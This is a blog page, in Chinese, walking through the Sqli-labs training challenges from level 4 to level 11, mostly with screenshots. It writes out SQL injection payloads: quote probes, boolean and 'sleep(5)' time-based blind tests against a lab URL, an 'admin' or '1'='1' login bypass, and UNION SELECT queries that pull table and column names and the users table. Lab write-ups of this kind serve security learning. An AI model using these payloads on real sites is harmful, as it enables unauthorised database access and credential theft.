@@ -1,0 +1,623 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    Hexo
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">MICCALL</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >Sqli-labs（4-21关）</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><h3 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p>常见注入点：<br>?id&#x3D;1’<br>?id&#x3D;1”<br>?id&#x3D;1’)<br>?id&#x3D;1”)</p>
+<p>经尝试，判断注入点为id&#x3D;1”<br><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/4%E6%B3%A8%E5%85%A5%E7%82%B9.png" alt="4注入点"><br><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/4%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="4注入点2"><br><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/4%E6%B3%A8%E5%85%A5%E7%82%B93.png" alt="4注入点3"></p>
+<p>其余与1-3关完全一样</p>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><h3 id="1-判断注入点："><a href="#1-判断注入点：" class="headerlink" title="1.判断注入点："></a>1.判断注入点：</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E6%B3%A8%E5%85%A5%E7%82%B90.png" alt="5注入点0"></p>
+<p>输入id&#x3D;1，发现没有回显，说明为盲注</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="5注入点1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="5注入点2"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E6%B3%A8%E5%85%A5%E7%82%B93.png" alt="5注入点3"></p>
+<p>说明为单引号字符串闭合</p>
+<h3 id="2-爆数据库名："><a href="#2-爆数据库名：" class="headerlink" title="2.爆数据库名："></a>2.爆数据库名：</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" alt="5数据库名"></p>
+<h3 id="3-爆数据库中的表："><a href="#3-爆数据库中的表：" class="headerlink" title="3.爆数据库中的表："></a>3.爆数据库中的表：</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8.png" alt="5数据库表"></p>
+<h3 id="4-爆表中信息："><a href="#4-爆表中信息：" class="headerlink" title="4.爆表中信息："></a>4.爆表中信息：</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E8%A1%A8%E4%B8%AD%E4%BF%A1%E6%81%AF.png" alt="5表中信息"></p>
+<h3 id="5-爆用户名和密码："><a href="#5-爆用户名和密码：" class="headerlink" title="5.爆用户名和密码："></a>5.爆用户名和密码：</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%811.png" alt="5用户密码1"></p>
+<p>注：报错注入有32位的限制 查不全 需要手动更改条件</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/5%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%812.png" alt="5用户密码2"></p>
+<p>以此类推，爆出所有用户和密码</p>
+<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><h3 id="1-判断注入点：-1"><a href="#1-判断注入点：-1" class="headerlink" title="1.判断注入点："></a>1.判断注入点：</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="6注入点1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="6注入点2"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%B3%A8%E5%85%A5%E7%82%B93.png" alt="6注入点3"></p>
+<p>说明为双引号字符串闭合</p>
+<h3 id="2-获取数据库名的长度："><a href="#2-获取数据库名的长度：" class="headerlink" title="2.获取数据库名的长度："></a>2.获取数据库名的长度：</h3><p>通过二分法判断数据库名的长度为8</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6.png" alt="6数据库长度"></p>
+<p>获得数据库名：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D1.png" alt="6数据库名1"></p>
+<p>得出数据库名第一个字母的ascii码值为115，为字母s</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D2.png" alt="6数据库名2"></p>
+<p>得出数据库名第二个字母的ascii码值为101，为字母e</p>
+<p>以此类推出后6个字母，得出数据库名为security</p>
+<h3 id="3-获得数据库表名："><a href="#3-获得数据库表名：" class="headerlink" title="3.获得数据库表名："></a>3.获得数据库表名：</h3><blockquote>
+<p>获得表的个数</p>
+</blockquote>
+<p>有回显则说明该数据库中有4个表</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%A8%E6%95%B0.png" alt="6表数"></p>
+<blockquote>
+<p>获得表名长度：</p>
+</blockquote>
+<p>第一个表的长度为6</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A64.png" alt="6表名长度4"></p>
+<p>第二个表的长度为8</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A61.png" alt="6表名长度1"></p>
+<p>第三个表的长度为7</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A62.png" alt="6表名长度2"></p>
+<p>第四个表的长度5</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A63.png" alt="6表名长度3"></p>
+<p><strong>注意：在limit n，m函数中n是从0开始计算</strong></p>
+<blockquote>
+<p>获得表名：</p>
+</blockquote>
+<p>获得第一个表的表名的第一个字母ASCII码为101，字母为e</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%A8%E5%90%8D1.png" alt="6表名1"></p>
+<p>获得第一个表的表名的第二个字母ASCII码为109，字母为m</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%A8%E5%90%8D2.png" alt="6表名2"></p>
+<p>以此类推得出第一个表名为emails</p>
+<p>获得第二个表的表名的第一个字母ASCII码为114，字母为r</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%A8%E5%90%8D3.png" alt="6表名3"></p>
+<p>以此类推得出其余三个表分别为referers、uagents、users</p>
+<h3 id="4-获取列名："><a href="#4-获取列名：" class="headerlink" title="4.获取列名："></a>4.获取列名：</h3><blockquote>
+<p>获得列的个数：</p>
+</blockquote>
+<p>有回显则说明该数据库中有3列</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E5%88%97%E6%95%B0.png" alt="6列数"></p>
+<blockquote>
+<p>获得列名长度：</p>
+</blockquote>
+<p>第一列长度为2</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E5%88%97%E5%90%8D%E9%95%BF%E5%BA%A61.png" alt="6列名长度1"></p>
+<p>第二列长度为8</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E5%88%97%E5%90%8D%E9%95%BF%E5%BA%A62.png" alt="6列名长度2"></p>
+<p>第三列长度为8</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E5%88%97%E5%90%8D%E9%95%BF%E5%BA%A63.png" alt="6列名长度3"></p>
+<blockquote>
+<p>获得列名：</p>
+</blockquote>
+<p>获得第一列的列名的第一个字母ASCII码为105，字母为i</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E5%88%97%E5%90%8D1.png" alt="6列名1"></p>
+<p>获得第一列的列名的第二个字母ASCII码为100，字母为d</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E5%88%97%E5%90%8D2.png" alt="6列名2"></p>
+<p>获得第二列的列名的第一个字母ASCII码为117，字母为u</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E5%88%97%E5%90%8D3.png" alt="6列名3"></p>
+<p>以此类推得出三列分别为id、username、password</p>
+<h3 id="5-获取数据"><a href="#5-获取数据" class="headerlink" title="5.获取数据"></a>5.获取数据</h3><blockquote>
+<p>获得数据行数：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E8%A1%8C%E6%95%B0.png" alt="6行数"></p>
+<blockquote>
+<p>获得数据：</p>
+</blockquote>
+<p>第一行第一个字母的ASCII码为68，字母为D</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%95%B0%E6%8D%AE1.png" alt="6数据1"></p>
+<p>第一行第二个字母的ASCII码为117，字母为u</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%95%B0%E6%8D%AE2.png" alt="6数据2"></p>
+<p>以此类推得出username的第一个数据为Dumb</p>
+<p>第二行第一个字母的ASCII码为65，字母为A</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/6%E6%95%B0%E6%8D%AE3.png" alt="6数据3"></p>
+<p>以此类推得出username的第二个数据为Angelina</p>
+<p>同理可得出username和password的所有信息</p>
+<h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><h3 id="1-判断注入点-1"><a href="#1-判断注入点-1" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p>先尝试单双引号，发现?id&#x3D;1’报错，初步判断为字符型注入</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/7%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="7注入点1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/7%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="7注入点2"></p>
+<p>利用 and 1&#x3D;1 测试?id&#x3D;1’</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/7%E6%B3%A8%E5%85%A5%E7%82%B93.png" alt="7注入点3"></p>
+<p>发现报错，接下来分析是否存在括号及其个数，依次增加括号个数，直到回显正常</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/7%E6%B3%A8%E5%85%A5%E7%82%B94.png" alt="7注入点4"></p>
+<p>可以得出是带双括号的单引号注入</p>
+<p>其余步骤同第六关使用布尔盲注（还可使用其他方法）</p>
+<h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><h3 id="1-判断注入点-2"><a href="#1-判断注入点-2" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p>先尝试单双引号，发现?id&#x3D;1’报错，初步判断为字符型注入</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/8%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="8注入点1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/8%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="8注入点2"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/8%E6%B3%A8%E5%85%A5%E7%82%B93.png" alt="8注入点3"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/8%E6%B3%A8%E5%85%A5%E7%82%B94.png" alt="8注入点4"></p>
+<p>利用 and 1&#x3D;1 &#x2F; and 1&#x3D;2 测试?id&#x3D;1’</p>
+<p>可以得出是单引号注入</p>
+<p>其余步骤同第六关使用布尔盲注</p>
+<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><h3 id="1-判断注入点-3"><a href="#1-判断注入点-3" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p>方法一:布尔盲注</p>
+<p>通过Content-length的长度不一样，也可以来判断页面正常与否</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%B3%A8%E5%85%A5%E7%82%B9%E6%96%B9%E6%B3%95%E4%B8%801.png" alt="9注入点方法一1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%B3%A8%E5%85%A5%E7%82%B9%E6%96%B9%E6%B3%95%E4%B8%802.png" alt="9注入点方法一2"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%B3%A8%E5%85%A5%E7%82%B9%E6%96%B9%E6%B3%95%E4%B8%803.png" alt="9注入点方法一3"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%B3%A8%E5%85%A5%E7%82%B9%E6%96%B9%E6%B3%95%E4%B8%804.png" alt="9注入点方法一4"></p>
+<p>可见此题是单引号注入，其余同前面集体使用布尔盲注解答</p>
+<p>方法二：时间盲注</p>
+<p>经尝试后发现结果都是You are in …于是可以大胆的猜测正确的输入和错误的输入返回的结果被设置成一样的了</p>
+<p>可得出这样的结论：</p>
+<p>①不返回报错信息页面，无法进行基于报错信息的盲注</p>
+<p>②页面不存在true和false两种不同的页面，无法进行对比也就无法进行布尔盲注</p>
+<p><strong>一般来说，在页面没有任何回显和错误信息提示的时候，我们就会测试时间盲注这最后的手法</strong></p>
+<p>测试下面3条语句</p>
+<p><a target="_blank" rel="noopener" href="http://45.32.113.109:52060/Less-9/?id=1">http://45.32.113.109:52060/Less-9/?id=1</a> and sleep(5)–+</p>
+<p><a target="_blank" rel="noopener" href="http://45.32.113.109:52060/Less-9/?id=1&#39;">http://45.32.113.109:52060/Less-9/?id=1&#39;</a> and sleep(5)–+</p>
+<p><a target="_blank" rel="noopener" href="http://45.32.113.109:52060/Less-9/?id=1%E2%80%9D">http://45.32.113.109:52060/Less-9/?id=1”</a> and sleep(5)–+</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%B3%A8%E5%85%A5%E7%82%B9%E6%96%B9%E6%B3%95%E4%BA%8C1.png" alt="9注入点方法二1"></p>
+<p>通过网络查看，发现只有?&#x3D;id’页面出现了5s延迟，说明为单引号时间盲注</p>
+<h3 id="2-获得数据库名长度"><a href="#2-获得数据库名长度" class="headerlink" title="2.获得数据库名长度"></a>2.获得数据库名长度</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A61.png" alt="9数据库长度1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A62.png" alt="9数据库长度2"></p>
+<p>说明数据库长度为8</p>
+<h3 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h3><p>获得数据库名第一个字母ASCII码为115，字母为s</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D1.png" alt="9数据库名1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D2.png" alt="9数据库名2"></p>
+<p>获得数据库名第二个字母ASCII码为115，字母为s</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D3.png" alt="9数据库名3"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D4.png" alt="9数据库名4"></p>
+<p>以此类推得出数据库名为security</p>
+<h3 id="4-获取数据库表名"><a href="#4-获取数据库表名" class="headerlink" title="4.获取数据库表名"></a>4.获取数据库表名</h3><blockquote>
+<p>获得表的个数</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E6%95%B01.png" alt="9表数1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E6%95%B02.png" alt="9表数2"></p>
+<p>可得出数据库中有4个表</p>
+<blockquote>
+<p>获得表名长度</p>
+</blockquote>
+<p>第一个表的表名长度为：6</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E5%90%8D%E9%95%BF1.png" alt="9表名长1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E5%90%8D%E9%95%BF2.png" alt="9表名长2"></p>
+<p>得出其余三个表长分别为：8、7、5</p>
+<blockquote>
+<p>获取表名</p>
+</blockquote>
+<p>获得数据库第一个表的名称的第一个字母ASCII码为101，字母为e</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E5%90%8D1.png" alt="9表名1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E5%90%8D2.png" alt="9表名2"></p>
+<p>获得数据库第一个表的名称的第二个字母ASCII码为109，字母为m</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E5%90%8D3.png" alt="9表名3"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E5%90%8D4.png" alt="9表名4"></p>
+<p>以此类推得出第一个表名为emails</p>
+<p>获得数据库第二个表的名称的第一个字母ASCII码为114，字母为r</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E5%90%8D5.png" alt="9表名5"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%A8%E5%90%8D6.png" alt="9表名6"></p>
+<p>以此类推得出其余三个表分别为referers、uagents、users</p>
+<h3 id="5-获取数据库列名"><a href="#5-获取数据库列名" class="headerlink" title="5.获取数据库列名"></a>5.获取数据库列名</h3><blockquote>
+<p>获取列的个数</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E6%95%B01.png" alt="9列数1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E6%95%B02.png" alt="9列数2"></p>
+<p>可得出users表内有3列</p>
+<blockquote>
+<p>获取列名长度</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E9%95%BF1.png" alt="9列长1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E9%95%BF2.png" alt="9列长2"></p>
+<blockquote>
+<p>获取列名</p>
+</blockquote>
+<p>第一列的名称的第一个字母的ASCII码为：105，字母为：i</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E5%90%8D1.png" alt="9列名1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E5%90%8D2.png" alt="9列名2"></p>
+<p>第一列的名称的第二个字母的ASCII码为：100，字母为：d</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E5%90%8D3.png" alt="9列名3"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E5%90%8D4.png" alt="9列名4"></p>
+<p>第二列的名称的第一个字母的ASCII码为：117，字母为：u</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E5%90%8D5.png" alt="9列名5"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E5%88%97%E5%90%8D6.png" alt="9列名6"></p>
+<p>以此类推得出三列分别为id、username、password</p>
+<h3 id="6-获取数据"><a href="#6-获取数据" class="headerlink" title="6.获取数据"></a>6.获取数据</h3><blockquote>
+<p>获取行数</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%8C%E6%95%B01.png" alt="9行数1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E8%A1%8C%E6%95%B02.png" alt="9行数2"></p>
+<blockquote>
+<p>获取数据</p>
+</blockquote>
+<p>第一行第一个字母的ASCII码为68，字母为D</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE1.png" alt="9数据1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE2.png" alt="9数据2"></p>
+<p>第一行第二个字母的ASCII码为117，字母为u</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE3.png" alt="9数据3"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE4.png" alt="9数据4"></p>
+<p>以此类推得出username的第一个数据为Dumb</p>
+<p>第二行第一个字母的ASCII码为65，字母为A</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE5.png" alt="9数据5"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/9%E6%95%B0%E6%8D%AE6.png" alt="9数据6"></p>
+<p>以此类推得出username的第二个数据为Angelina</p>
+<p>同理可得出username和password的所有信息</p>
+<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><h3 id="1-判断注入点-4"><a href="#1-判断注入点-4" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/10%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="10注入点1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/10%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="10注入点2"></p>
+<p>可得出是基于时间得双引号注入，其余操作同第九关</p>
+<h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><h3 id="1-判断注入点-5"><a href="#1-判断注入点-5" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p><strong>万能密码：admin’ or ‘1’&#x3D;’1 –+</strong></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/11%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="11注入点1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/11%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="11注入点2"></p>
+<p>说明为post型基于错误的单引号注入</p>
+<h3 id="2-获取字段数"><a href="#2-获取字段数" class="headerlink" title="2.获取字段数"></a>2.获取字段数</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/11%E5%AD%97%E6%AE%B5.png" alt="11字段"></p>
+<p>得出字段数为2</p>
+<h3 id="3-爆数据库"><a href="#3-爆数据库" class="headerlink" title="3.爆数据库"></a>3.爆数据库</h3><p>方法一：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/11%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="11当前数据库"></p>
+<p>-1’ union select 1,database()– #</p>
+<p>方法二：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/11%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%932.png" alt="11当前数据库2"></p>
+<p>‘ union select null,database()#</p>
+<h3 id="4-爆数据库中的表"><a href="#4-爆数据库中的表" class="headerlink" title="4.爆数据库中的表"></a>4.爆数据库中的表</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/11%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8.png" alt="11数据库表"></p>
+<p>-1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</p>
+<h3 id="5-爆表中字段"><a href="#5-爆表中字段" class="headerlink" title="5.爆表中字段"></a>5.爆表中字段</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/11%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5.png" alt="11表中字段"></p>
+<p>-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;”users” #</p>
